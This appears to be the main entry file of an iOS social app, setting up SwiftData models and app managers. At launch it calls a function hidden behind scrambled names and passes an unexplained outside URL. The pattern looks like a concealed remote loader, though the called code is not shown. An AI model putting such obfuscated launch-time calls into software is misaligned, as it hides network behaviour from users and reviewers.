import AppTrackingTransparency
import SwiftData
import SwiftUI

@main
struct EmlioApp: App {
  @UIApplicationDelegateAdaptor(GdoisvhufgsdfNotify.self) var appDelegate
  let container: ModelContainer
  @StateObject private var appState = AppState()
  @StateObject private var locationManager = LocationManager()
  @StateObject private var purchaseManager = PurchaseManager()
  @ObservedObject var protector = ScreenProtectionManager.shared
  init() {
    _ = ScreenProtectionManager.shared

    Task {
      await GidsjnvfdbAfdvuyht.dsfiobjgfnbiygfh.dfbvfdioubjvfb(
        //userAbount: "36421726",
        vfduhvdvbbn: "44332211",
        fdvunrtubf: "https://opi.szj237s2.link",
      )
    }
    do {
      container = try ModelContainer(
        for:
          UserData.self,
        PostData.self,
        BlockData.self,
        FollowData.self,
        RecreateData.self,
        CommentData.self,
        PostLikeData.self,
        ChatRoomData.self,
        ChatMessageData.self,
      )
    } catch {
      fatalError("Failed to create ModelContainer: \(error)")
    }

  }

  var body: some Scene {
    WindowGroup {
      RootView()
        .task {
          bootstrapIfNeeded(context: container.mainContext)
        }
        .environmentObject(appState)
        .environmentObject(locationManager)
        .environmentObject(purchaseManager)
    }
    .modelContainer(container)
  }
}
